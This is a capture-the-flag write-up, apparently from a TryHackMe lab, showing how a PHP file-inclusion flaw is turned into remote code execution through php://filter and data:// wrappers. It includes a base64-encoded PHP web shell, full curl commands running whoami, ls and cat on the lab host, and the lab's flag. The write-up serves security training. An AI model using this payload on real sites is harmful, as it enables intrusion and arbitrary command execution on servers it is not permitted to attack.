# Writeup: PHP Wrapper Exploitation to RCE

Target: http://10.82.135.155/playground.php

Vulnerability: Local File Inclusion (LFI) / Remote Code Execution (RCE)

Vector: PHP Filter Wrapper (php://filter)
# 1. Vulnerability Overview

The application's page parameter was found to be vulnerable to file inclusion. By utilizing the php://filter wrapper with a base64-decode filter, it is possible to inject and execute arbitrary PHP code.
# 2. Exploitation Steps
Step 1: Crafting the Payload

We use a PHP snippet that executes commands passed via a secondary GET parameter named cmd: <?php system($_GET['cmd']); echo 'Shell done !'; ?>

When encoded to Base64, this becomes: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
# Step 2: Verification (Whoami)

The following command confirms the exploit works and identifies the current user:

curl "http://10.82.135.155/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami"

Output: www-data
# Step 3: Enumeration

Listing the directory contents to find the flag location:

curl "http://10.82.135.155/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls%20-la"

Checking the flags directory:

curl "http://10.82.135.155/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls%20flags"

Found: cd3c67e5079de2700af6cea0a405f9cc.txt
# Step 4: Reading the Flag

Executing the cat command on the discovered file:

curl "http://10.82.135.155/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat%20flags/cd3c67e5079de2700af6cea0a405f9cc.txt"
# 3. Results

Flag: THM{fl4g_cd3c67e5079de2700af6cea0a405f9cc}
